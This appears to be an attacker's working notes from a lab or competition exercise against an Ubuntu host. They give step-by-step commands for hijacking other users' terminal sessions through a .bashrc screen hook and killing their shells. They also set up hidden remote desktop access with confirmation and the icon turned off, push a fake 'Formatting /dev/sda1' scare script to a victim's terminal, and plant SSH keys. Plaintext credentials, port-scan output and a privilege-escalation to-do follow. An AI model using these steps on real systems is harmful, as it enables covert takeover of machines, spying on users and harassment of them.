https://askubuntu.com/questions/47642/how-to-start-a-gui-software-on-a-remote-linux-pc-via-ssh

ssh jackbauer@192.168.199.128 -X # enables X11 forwarding

https://unix.stackexchange.com/questions/10121/open-a-window-on-a-remote-x-display-why-cannot-open-display

Might be able to start a screen session on the remote machine and then attach to start a screen display?


# Shell hijacking:
1. Login by typing `ssh -t username@hostname /bin/sh` (using bash triggers the new screen session so use a different shell)
2. Make their shells start as screen sessions: `echo 'screen -D -R -S multi' >> ~/.bashrc`
3. Figure out your tty: `tty`
4. Find their current shell: `ps auxww | grep bash`
5. Kill the shell that isn't your current tty: `kill -9 14325`
6. To hijack their terminal: `screen -x multi`
7. To exit the terminal without closing their session, press <kbd>CTRL</kbd>+<kbd>A</kbd>+<kbd>D</kbd>

# Set up RDP:
1. `ssh surnow@192.168.199.128 -Y`
2. `vino-preferences`
    * Enable "Allow other users to view your desktop"
    * Disable "You must confirm each access to this machine"
    * Enable "Configure network automatically to accept connections"
    * Enable "Never display an icon"
3. Type `remmina` on the attacker machine (not in the ssh'd terminal)
4. Type in the server, username, password, and go to the "SSH Tunnel" tab and enable it

# Make them think their drive is being deleted:
```
#!/bin/bash
{
    for ((i = 0 ; i <= 99 ; i+=1)); do
        sleep 0.1
        echo $i
    done
    sleep 3
	for ((i = 99 ; i >= 0 ; i-=1)); do
        sleep 0.1
        echo $i
    done
} | whiptail --gauge "Formatting /dev/sda1..." 6 50 0
```

then type `./test.sh > /dev/pts/0` to send it to their terminal window


Generate SSH keys:
`ssh-keygen`

Copy SSH key to target machine:
`ssh-copy-id -i ~/.ssh/id_rsa surnow@192.168.199.128`


Check what group a user belongs to:
`id -Gn`

# User information:
User: jackbauer<br>
Password: devgru6<br>
Groups: jackbauer<br>

User: chloe<br>
Password: chloechloe<br>
Groups: chloe adm dialout fax cdrom floppy tape dip video plugdev fuse<br>

User: surnow<br>
Password: surnowsurnow<br>
Groups: surnow adm dialout fax cdrom floppy tape dip video plugdev fuse admin<br>
** Note: this is the only user with sudo privileges<br>


# Services running and their versions:
PORT      STATE SERVICE       VERSION<br>
22/tcp    open  ssh           OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)<br>
80/tcp    open  http          Apache httpd 2.2.17 ((Ubuntu))<br>
8080/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1<br>


TODO: figure out how to escalate privileges once logged into jackbauer since that account doesn't belong to the sudo group
